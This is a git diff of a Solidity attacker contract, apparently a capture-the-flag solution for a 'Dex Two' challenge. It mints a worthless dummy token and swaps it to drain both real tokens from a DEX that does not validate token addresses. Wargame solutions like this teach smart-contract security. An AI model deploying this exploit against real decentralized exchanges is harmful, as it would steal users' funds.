@@ -58,24 +58,15 @@ contract SwappableTokenTwo is ERC20 {
     }
 }
 
-contract Dex2Attacker {
-
-    constructor() {
-
-    }
+contract DexTwoAttacker {
 
     function attack(address dex) public {
-        // deploy new token
-        SwappableTokenTwo dummyToken = new SwappableTokenTwo(dex, "DummyToken", "DTKN", 10);
+        SwappableTokenTwo dummyToken = new SwappableTokenTwo(dex, "DummyToken", "DTKN", 4);
 
-        // transfer amount to dex
         dummyToken.transfer(dex, 1);
 
-        // aprove all the tokens
-        // DexTwo(dex).approve(dex, 100);
-        dummyToken.approve(address(this), dex, 10);
+        dummyToken.approve(address(this), dex, 3);
 
-        // call the swap functions
         DexTwo(dex).swap(address(dummyToken), DexTwo(dex).token1(), 1);
         DexTwo(dex).swap(address(dummyToken), DexTwo(dex).token2(), 2);
     }
